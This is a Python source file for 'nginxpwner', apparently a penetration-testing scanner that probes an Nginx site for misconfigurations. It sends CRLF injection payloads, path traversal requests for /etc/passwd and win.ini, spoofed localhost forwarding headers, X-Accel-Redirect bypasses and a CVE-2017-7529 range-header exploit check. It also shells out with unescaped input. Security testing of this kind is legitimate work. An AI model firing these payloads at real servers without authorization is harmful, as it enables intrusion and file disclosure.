import requests
import sys
from bs4 import BeautifulSoup
import re
from packaging import version
import os
import requests_raw
from colorama import Fore
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

banner='''
 _   _  _____  _____  _   _ __   ________  _    _  _   _  _____ ______
| \ | ||  __ \|_   _|| \ | |\ \ / /| ___ \| |  | || \ | ||  ___|| ___ \\
|  \| || |  \/  | |  |  \| | \ V / | |_/ /| |  | ||  \| || |__  | |_/ /
| . ` || | __   | |  | . ` | /   \ |  __/ | |/\| || . ` ||  __| |    /
| |\  || |_\ \ _| |_ | |\  |/ /^\ \| |    \  /\  /| |\  || |___ | |\ \\
\_| \_/ \____/ \___/ \_| \_/\/   \/\_|     \/  \/ \_| \_/\____/ \_| \_|
            A common vulnerability scanner for Nginx
                      Author @stark0de1'''

print(Fore.BLUE+banner)

if len(sys.argv) != 3:
    print(f"{Fore.WHITE}Usage: python3 nginxpwner.py https://example.com filewithexistingfolderpaths")
    sys.exit()
if sys.argv[1].endswith("/"):
    print(f"{Fore.WHITE}[?] Please provide the URL without the last slash")
    sys.exit()

url = sys.argv[1]
existingfolderpathlist = sys.argv[2] 


basereq = requests.get(url, verify=False)

print(f"{Fore.BLUE}[?] If the tool reveals the nginx.conf file this is probably because there is no root directive in the nginx.conf file. Get the contents of the file and use https://github.com/yandex/gixy to find more misconfigurations")
print(f"{Fore.WHITE}\n\n")
os.system(f"gobuster dir -k --url '{url}' -w ./nginx.txt --wildcard --random-agent")
print("\n")
uri_crlf_test= requests.get(url+"/%0d%0aDetectify:%20clrf", verify=False)
if "Detectify" in uri_crlf_test.headers:
    print(f"{Fore.RED}[-] CRLF injection found via $uri or $document_uri parameter with payload: %0d%0aDetectify:%20crlf as URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")
else:
    print(f"{Fore.GREEN}[+] No CRLF via common misconfiguration found")
#p = subprocess.Popen('curl -IL -X PURGE -D - "'+url+'"/* | grep HTTP', shell=True, stdout=subprocess.PIPE)
#output, _ = p.communicate()
purgemethod=requests.request("PURGE", url+"/*", allow_redirects=True, verify=False)
#print(purgemethod.text+str(purgemethod.headers)+str(purgemethod.status_code))
if purgemethod.status_code == 204:
    print(f"{Fore.RED}[-] Possibly misconfigured PURGE HTTP method (purges the web cache), test this HTTP method manually")
else:
    print(f"{Fore.GREEN}[+] No signs of misconfigured PURGE HTTP method")

headers={"Referer": "bar"}
variable_leakage = requests.get(url+"/foo$http_referer", headers=headers, verify=False)
if "foobar" in variable_leakage.text:
    print(f"{Fore.RED}[-] Variable leakage found in NGINX via Referer header")
    print(f"{Fore.RED}[-] Test other variables like $realpath_root, $nginx_version")
else:
    print(f"{Fore.GREEN}[+] No variable leakage misconfiguration found")
#merge-slashes set to off
merge_slashes_req = requests.get(url+"///", verify=False)
merge_slashes_etc_passwd_old = requests.get(url+ "///../../../../../etc/passwd", verify=False)
merge_slashes_etc_passwd = requests.get(url+ "//////../../../../../../etc/passwd", verify=False)
merge_slashes_winini_old = requests.get(url+ "///../../../../../win.ini", verify=False)
merge_slashes_winini = requests.get(url+ "//////../../../../../../win.ini", verify=False)
 
if basereq.status_code == merge_slashes_req and basereq.text == merge_slashes_req.text:
    print(f"{Fore.RED}[-] Merge slashes set to off. This is useful in case we find an LFI")
if merge_slashes_etc_passwd.status_code == 200 or merge_slashes_etc_passwd_old.status_code ==200:
    print(f"{Fore.RED}[-] Possible path traversal vulnerability found for insecure merge_slashes setting")
    print(f"{Fore.RED}[-] Try this to URIs manually: ///../../../../../etc/passwd and //////../../../../../../etc/passwd")
elif merge_slashes_winini.status_code == 200 or merge_slashes_winini_old.status_code ==200:
    print(f"{Fore.RED}[-] Possible path traversal vulnerability found for insecure merge_slashes setting")
    print(f"{Fore.RED}[-] Try this to URIs manually: ///../../../../../win.ini and //////../../../../../../win.ini")
else:
    print(f"{Fore.GREEN}[+] No merge_slashes misconfigurations found\n")
print(f"{Fore.BLUE}[?] Testing hop-by-hop headers{Fore.WHITE}\n")
onetwosevendict={}
localhostdict={}
oneninetwodict={}
tenzerozerodict={}

complete_header_list = [
    "Proxy-Host","Request-Uri","X-Forwarded","X-Forwarded-By","X-Forwarded-For",
    "X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Server","X-Forwarder-For",
    "X-Forward-For","Base-Url","Http-Url","Proxy-Url","Redirect","Real-Ip","Referer",
    "Referrer","Uri","Url","X-Host","X-Http-Destinationurl","X-Http-Host-Override",
    "X-Original-Remote-Addr","X-Original-Url","X-Proxy-Url","X-Rewrite-Url","X-Real-Ip","X-Remote-Addr", "X-Proxy-URL", "X-Original-Host", "X-Originally-Forwarded-For", "X-Forwarded-For-Original",
    "X-Originating-Ip","X-Ip", "X-Client-Ip", "X-Real-Ip"
    ]
for i in complete_header_list:
    onetwosevendict.update({i: "127.0.0.1"})
for i in complete_header_list:
    localhostdict.update({i: "localhost"})
for i in complete_header_list:
    oneninetwodict.update({i: "192.168.1.1"})
for i in complete_header_list:
    tenzerozerodict.update({i: "10.0.0.1"})
counter=0

r_first= requests.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in onetwosevendict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z, verify=False)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for 127.0.0.1 tests")

counter=0

r_first= requests.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in localhostdict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z, verify=False)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for localhost tests")

counter=0

r_first= requests.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in oneninetwodict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z, verify=False)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for 192.168.1.1 tests")

counter=0

r_first= requests.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
for x, y in tenzerozerodict.items():
    z = {x:y}
    r = requests.get(url+"/", headers=z, verify=False)
    resta = len(r.text) - len(r_first.text)
    if r.status_code != r_first.status_code or resta > 20:
       print("Difference found with headers:")
       print(r.request.headers)
       counter+=1
if counter == 0:
   print("No relevant results for 10.0.0.1 tests")

print(f"\n{Fore.BLUE}[?] To test Raw backend reading responses, please make a request with the following contents to Nginx. In case the response is interesting: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#raw-backend-response-reading")
a='''
GET /? XTTP/1.1
Host: 127.0.0.1
Connection: close
'''
print(Fore.WHITE+a)

phpindexreq = requests.get(url+"/index.php", allow_redirects=True, verify=False)
if phpindexreq.status_code == 200:
     print(Fore.GREEN+"[+] The site uses PHP")
elif "PHPSESSID" in basereq.cookies:
     print(Fore.GREEN+"[+] The site is using PHP")
elif 'Server' in basereq.headers:
    if "php" in basereq.headers["Server"]:
        print(Fore.GREEN+ "[+] The site is using PHP")
elif "X-Powered-By" in basereq.headers:
    if "php" in basereq.headers["X-Powered-By"]:
        print(Fore.GREEN+ "[+] The site is using PHP")

print(f"{Fore.YELLOW}[!] If the site uses PHP check for this misconfig: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#script_name and also check this: https://github.com/jas502n/CVE-2019-11043. A last advice, if you happen to have a restricted file upload and you can reach the file you uploaded try making a request to <filename>/whatever.php,and if it executes PHP code it is because the PHP-FastCGI directive is badly configured (this normally only works for older PHP versions)")
print("\n")
print(f"{Fore.BLUE}[?] Executing Kyubi to check for path traversal vulnerabilities via misconfigured NGINX alias directive{Fore.WHITE}")
pathlist = open(existingfolderpathlist, "r")
pathlines = pathlist.readlines()
for pathline in pathlines:
    os.system(f"kyubi '{url}/{pathline.strip()}'")
pathlist.close()

pathlist2 = open(existingfolderpathlist, "r")
pathlines = pathlist2.readlines()
counterunauthorised=0
for pathline in pathlines:
    makereq = requests.get(url+"/"+pathline.strip(), verify=False)
    if makereq.status_code == 401 or makereq.status_code == 403:
        counterunauthorised +=1
        accel = {"X-Accel-Redirect" : "/"+pathline.strip()}
        accelreq = requests.get(url+"/randompath",headers=accel)
        if accelreq.status_code != makereq.status_code:
            print(f"{Fore.RED}[-] Different status code when accessing {pathline.strip()} using a randompath in the URI, but the this path in the X-Accel-Redirect header")
        else:
            print(f"{Fore.GREEN}[+] No difference found with X-Accel-Redirect when trying to access {pathline}")
if counterunauthorised == 0:
    print(f"{Fore.GREEN}\n[+] No X-Accel-Redirect bypasses found using it as request header")
pathlist2.close()

pathlist3 = open(existingfolderpathlist, "r")
pathlines = pathlist3.readlines()
print(f"{Fore.CYAN}\n[?] Testing all provided paths to check to CRLF injection. This is specially interesting if the site uses S3 buckets or GCP to host files")
for pathline in pathlines:
    uri_crlf_test= requests.get(f"{url}/{pathline.strip()}%0d%0aDetectify:%20clrf", verify=False)
if "Detectify" in uri_crlf_test.headers:
    print(f"{Fore.RED}[-] CRLF injection found via in URL:{url}/{pathline.strip()} payload: %0d%0aDetectify:%20crlf in URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")

print(f"{Fore.CYAN}\n[?] Testing for common integer overflow vulnerability in nginx's range filter module")

def send_http_request(url, headers={}, timeout=8.0):
    httpResponse   = requests.get(url, headers=headers, timeout=timeout, verify=False)
    httpHeaders    = httpResponse.headers

    print(f"status: {httpResponse.status_code}: Server: {httpHeaders.get('Server', '')}")
    return httpResponse


def exploit(url):
    print(f"target: {url}")
    httpResponse   = send_http_request(url)

    content_length = httpResponse.headers.get('Content-Length', 0)
    bytes_length   = int(content_length) + 623
    content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)

    httpResponse   = send_http_request(url, headers={ 'Range': content_length })
    if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
        print(f"{Fore.RED}\n[+] Vulnerable to CVE-2017-7529, use this to exploit https://github.com/souravbaghz/Scanginx/blob/master/dumper.py")
    else:
        print(f"{Fore.GREEN}\n[+] Non vulnerable")

exploit(url)

print(f"\n\n{Fore.CYAN}\n[?] If the site uses Redis, please do check out: https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/")

print(f"\n\n{Fore.CYAN}[*] More things that you need to test by hand: CORS misconfiguration (ex: bad regex) with tools like Corsy, Host Header injection, Web cache poisoning & Deception in case NGINX is being for caching as well, HTTP request smuggling both normal request smuggling and https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf. As well as the rest of typical web vulnerabilities")
